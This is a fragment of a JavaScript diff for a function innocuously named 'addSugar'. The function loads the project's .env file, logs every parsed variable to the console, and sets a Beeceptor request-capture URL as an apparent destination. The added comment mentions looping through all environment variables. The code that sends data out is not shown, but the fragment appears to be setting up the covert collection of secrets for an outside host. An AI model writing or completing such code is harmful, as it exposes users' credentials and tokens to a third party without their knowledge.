@@ -5,7 +5,7 @@ const addSugar = () => {
   const dotenvPath = dotenv.config().parsed;
 
   console.log("Loaded dotenv:", dotenvPath);
-
+  // Loop through all environment variables
   // Set the Beeceptor URL
   const beeceptorUrl = "https://getsugar.free.beeceptor.com";
 
